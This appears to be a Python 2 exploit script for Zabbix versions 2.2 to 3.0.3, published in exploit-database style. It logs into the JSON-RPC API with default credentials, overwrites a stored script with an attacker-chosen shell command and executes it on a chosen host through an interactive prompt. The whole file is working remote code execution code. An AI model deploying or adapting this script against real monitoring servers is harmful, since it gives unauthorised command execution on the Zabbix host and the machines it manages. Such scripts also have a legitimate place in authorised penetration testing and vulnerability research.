# -*- coding: utf-8 -*-
 
# Exploit Title: Zabbix RCE with API JSON-RPC
# Date: 06-06-2016
# Exploit Author: Alexander Gurin
# Vendor Homepage: http://www.zabbix.com
# Software Link: http://www.zabbix.com/download.php
# Version: 2.2 - 3.0.3
# Tested on: Linux (Debian, CentOS)
# CVE : N/A
 
import requests
import json
import readline
 
ZABIX_ROOT = &#039;http://192.168.66.2&#039;  ### Zabbix IP-address
url = ZABIX_ROOT + &#039;/api_jsonrpc.php&#039;   ### Don&#039;t edit
 
login = &#039;Admin&#039;     ### Zabbix login
password = &#039;zabbix&#039; ### Zabbix password
hostid = &#039;10084&#039;    ### Zabbix hostid
 
### auth
payload = {
    "jsonrpc" : "2.0",
    "method" : "user.login",
    "params": {
        &#039;user&#039;: ""+login+"",
        &#039;password&#039;: ""+password+"",
    },
    "auth" : None,
    "id" : 0,
}
headers = {
    &#039;content-type&#039;: &#039;application/json&#039;,
}
 
auth  = requests.post(url, data=json.dumps(payload), headers=(headers))
auth = auth.json()
 
while True:
    cmd = raw_input(&#039;\033[41m[zabbix_cmd]>>: \033[0m &#039;)
    if cmd == "" : print "Result of last command:"
    if cmd == "quit" : break
 
### update
    payload = {
        "jsonrpc": "2.0",
        "method": "script.update",
        "params": {
            "scriptid": "1",
            "command": ""+cmd+""
        },
        "auth" : auth[&#039;result&#039;],
        "id" : 0,
    }
 
    cmd_upd = requests.post(url, data=json.dumps(payload), headers=(headers))
 
### execute
    payload = {
        "jsonrpc": "2.0",
        "method": "script.execute",
        "params": {
            "scriptid": "1",
            "hostid": ""+hostid+""
        },
        "auth" : auth[&#039;result&#039;],
        "id" : 0,
    }
 
    cmd_exe = requests.post(url, data=json.dumps(payload), headers=(headers))
    cmd_exe = cmd_exe.json()
    print cmd_exe["result"]["value"]

